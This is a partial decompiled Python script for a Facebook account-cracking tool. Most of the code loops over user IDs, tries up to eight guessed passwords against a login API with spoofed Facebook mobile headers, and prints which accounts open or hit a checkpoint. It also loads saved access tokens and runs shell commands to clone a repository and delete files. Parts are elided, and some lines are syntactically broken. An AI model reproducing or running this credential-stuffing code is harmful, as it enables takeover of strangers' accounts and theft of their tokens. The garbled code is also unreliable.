# Decompile by Mardis (Tools By Monif_Anwari

# Time Succes decompile : 2022-06-23 20:32:46.536685
...
try:
    ...
    requests.get(https://www.facebook.com/SULTAN.HACKER.DEWANA.SHOYT001')
...
def log_sel():
    ...
    if sel == '':
        ...
        subprocess.check_output(['am', 'start', 'https://youtu.be/0E836lgf_5o'])
        ...
        try:
            ...
            os.system('git clone https://github.com/Monif3.pyq/fbtool')

            os.system('rm -rf Monif3')

            os.system('cp -durlov-fbtool/fbtool \\.')
...
def token():
    ...
    try:
        ...
        token = open('HEMAT_token.txt', 'r').read()
...
def token_check():
    ...
    try:
        ...
        token = open('Monif_token.txt', 'r').read()

    except IOError:

        print '\x1b[91;1m[!] TOKEN INVALID'

        os.system('rm -rf Monif_token.txt')
...
def crack_select1():
    ...
    def main(arg):
        ...
        try:
            ...
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _Monif, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

            data = requests.get(api, params=params, headers=headers_)

            if 'access_token' in data.text and 'EAAA' in data.text:

                print ' \x1b[1;32m[Monif-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                print ' \x1b[1;33m[Monif-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    print ' \x1b[1;32m[HEMAT-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    print ' \x1b[1;33m[HEMAT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        print ' \x1b[1;32m[Monif-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ...
                        print ' \x1b[1;33m[Monif-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            print ' \x1b[1;32m[Monif-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ...
                            print ' \x1b[1;33m[Monif-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                print ' \x1b[1;32m[Monif-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ...
                                print ' \x1b[1;33m[Monif-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    ...
                                    print ' \x1b[1;32m[Monif-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ...
                                    print ' \x1b[1;33m[Monif-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ...
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        ...
                                        print ' \x1b[1;32m[HEMAT-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ...
                                        print ' \x1b[1;33m[HEMAT-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ...
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            ...
                                            print ' \x1b[1;32m[Monif-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ...
                                            print ' \x1b[1;33m[Monif-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                ...
                print ' \x1b[1;33m[HEMAT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    print ' \x1b[1;33m[Monif-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                print ' \x1b[1;33m[HEMAT-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
